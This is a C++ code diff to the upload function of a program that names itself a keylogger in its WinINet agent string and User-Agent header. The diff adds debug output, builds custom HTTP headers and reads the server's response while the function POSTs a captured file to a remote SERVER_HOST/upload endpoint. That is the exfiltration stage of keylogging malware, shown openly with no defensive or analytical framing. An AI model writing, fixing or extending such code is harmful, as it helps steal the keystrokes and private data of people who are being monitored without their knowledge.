@@ -51,6 +51,10 @@ void sendToApi(const std::string &filename)
     std::string contentType = "Content-Type: multipart/form-data; boundary=" + boundary;
     std::wstring wContentType(contentType.begin(), contentType.end());
 
+    printf("[DEBUG] Request URL: https://%s/upload\n", SERVER_HOST);
+    printf("[DEBUG] Content-Type: %s\n", contentType.c_str());
+    printf("[DEBUG] Body preview (first 200 chars): %s\n", body.substr(0, 200).c_str());
+
     HINTERNET hInternet = InternetOpenA("Keylogger", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if (!hInternet)
         return;
@@ -73,7 +77,12 @@ void sendToApi(const std::string &filename)
         return;
     }
 
-    BOOL sent = HttpSendRequestA(hRequest, contentType.c_str(), -1L,
+    std::string headers = contentType + "\r\n";
+    headers += "Host: " + std::string(SERVER_HOST) + "\r\n";
+    headers += "User-Agent: Keylogger/1.0\r\n";
+    headers += "Accept: */*\r\n";
+
+    BOOL sent = HttpSendRequestA(hRequest, headers.c_str(), headers.length(),
                                  (LPVOID)body.c_str(), body.length());
     DWORD err = GetLastError();
 
@@ -86,6 +95,15 @@ void sendToApi(const std::string &filename)
                           &statusCode, &size, NULL))
         {
             printf("[✓] HTTP response code: %lu\n", statusCode);
+
+            // Get response body for debugging
+            char responseBuffer[1024];
+            DWORD bytesRead = 0;
+            if (InternetReadFile(hRequest, responseBuffer, sizeof(responseBuffer) - 1, &bytesRead))
+            {
+                responseBuffer[bytesRead] = '\0';
+                printf("[DEBUG] Response body: %s\n", responseBuffer);
+            }
         }
         else
         {
@@ -96,7 +114,6 @@ void sendToApi(const std::string &filename)
     {
         printf("[!] HttpSendRequest failed. With error %lu\n", err);
     }
-
 
     InternetCloseHandle(hRequest);
     InternetCloseHandle(hConnect);
